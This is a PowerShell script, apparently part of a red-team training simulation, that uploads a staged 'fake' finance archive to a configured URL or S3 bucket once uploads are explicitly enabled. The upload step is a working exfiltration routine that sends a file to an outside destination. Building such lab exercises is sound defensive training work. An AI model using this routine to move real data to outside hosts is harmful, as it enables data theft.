<#
Attempts controlled upload of fake finance archive to an approved lab destination.
Requires enableUpload=true and either uploadUrl or awsLabBucket in simulation_config.json.
#>
[CmdletBinding()]
param()

$ErrorActionPreference = "Stop"
. "$PSScriptRoot\common.ps1"

$Config = Get-SimulationConfig
$Root = Get-SimulationRoot -Config $Config
$Archive = Join-Path $Root "staging\finance_review_backup.zip"

if (-not (Test-Path $Archive)) {
    throw "Archive not found. Run 05_stage_finance_data.ps1 first."
}

if (-not $Config.enableUpload) {
    throw "Upload is disabled. Set enableUpload=true only after configuring an approved lab destination."
}

if ($Config.uploadUrl) {
    Write-TrainingStatus "Uploading fake archive to approved lab URL."
    Invoke-WebRequest -Uri $Config.uploadUrl -Method Post -InFile $Archive -ContentType "application/zip" -UseBasicParsing | Out-Null
    Write-TrainingStatus "Controlled URL upload attempt complete."
    return
}

if ($Config.awsLabBucket) {
    $Aws = Get-Command "aws.exe" -ErrorAction SilentlyContinue
    if (-not $Aws) {
        $Aws = Get-Command "aws" -ErrorAction SilentlyContinue
    }
    if (-not $Aws) {
        throw "AWS CLI was not found on this machine."
    }

    $ProfileArgs = @()
    if ($Config.awsProfile) {
        $ProfileArgs += @("--profile", $Config.awsProfile)
    }
    if ($Config.awsRegion) {
        $ProfileArgs += @("--region", $Config.awsRegion)
    }

    $Key = "silent-checkout/finance_review_backup.zip"
    Write-TrainingStatus "Uploading fake archive to approved lab S3 bucket."
    & $Aws.Source @ProfileArgs s3 cp $Archive "s3://$($Config.awsLabBucket)/$Key"
    Write-TrainingStatus "Controlled S3 upload attempt complete."
    return
}

throw "No upload destination configured. Set uploadUrl or awsLabBucket in simulation_config.json."

